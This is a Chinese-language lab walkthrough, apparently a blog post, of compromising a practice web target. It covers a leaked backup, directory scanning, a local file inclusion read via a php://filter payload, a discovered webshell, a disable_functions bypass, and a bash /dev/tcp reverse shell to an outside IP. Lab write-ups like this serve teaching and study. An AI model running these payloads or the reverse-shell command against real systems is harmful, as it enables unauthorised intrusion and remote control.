**目标：http://115.126.12.38:90/（均为靶场环境）**

线上靶场：

当打开这个网站发现空白界面什么都没有（就先随便看看吧），先右击查看一下源代码，我们发现出现#<!---- cat robots-back-hack.bak
----!>#。

![](https://image.3001.net/images/20220401/1648792962_6246958291b548bd55424.png!small)试着去访问一下，发现可以下载，成功下载之后发现了两个禁止访问的目录，那么可以试着去使用7kb来进行扫描一下目录。

![](https://image.3001.net/images/20220401/1648792993_624695a1e21a659fbe10c.png!small)通过扫描发现一个www.tar.gz的压缩包，我拿到linux服务器进行解压，查看，下面就是整个压缩包里面的文件了。

![](https://image.3001.net/images/20220401/1648793012_624695b49902e91cfaa51.png!small)

![](https://image.3001.net/images/20220401/1648793026_624695c25e4f6e1f620f7.png!small)下一步我查看backeropena.php文件，只要是稍微懂点代码的人都清楚，这里存在包含漏洞（本地包含漏洞）。

![](https://image.3001.net/images/20220401/1648793052_624695dcaee9b571bbc4d.png!small)

我试着去访问一下这个文件，物理路径爆出来了，那么可以试着使用php协议进行读取他的index.php首页文件看看。

php://filter/read=convert.base64-encode/resource=/www/wwwroot/115.126.12.38/index.php

![](https://image.3001.net/images/20220401/1648793080_624695f83f077a9fd5a73.png!small)

![](https://image.3001.net/images/20220401/1648793090_62469602e683c192537c3.png!small)

已经读取出来了，beas加密，拿出来神器进行解码一下， 发现这本身就是一个shell。

![](https://image.3001.net/images/20220401/1648793120_62469620a188e650a1eb8.png!small)使用蚁剑进行连接，执行命令看看是什么权限。

![](https://image.3001.net/images/20220401/1648793145_624696397b240c59ccedc.png!small)

执行不了命令，查看一下phpinfo，发现函数都给禁用了。。。。

![](https://image.3001.net/images/20220401/1648793173_6246965571249882438df.png!small)接下来得绕过disable_function才能进行下一步操作，蚁剑的插件市场有写好的绕过工具。

![](https://image.3001.net/images/20220401/1648793194_6246966ac0546fb8b3eff.png!small)![](https://image.3001.net/images/20220401/1648793209_62469679e534df619329a.png!small)

下一步当然是反弹shell了：

  * nc -vvlp 7777 监听

  * bash -c 'exec bash -i &>/dev/tcp/182.42.122.253/7777 <&1' 反弹成功反弹shell

![](https://image.3001.net/images/20220401/1648793249_624696a11b8ca40bcfb81.png!small)文章到此结束，此靶场复现成功。

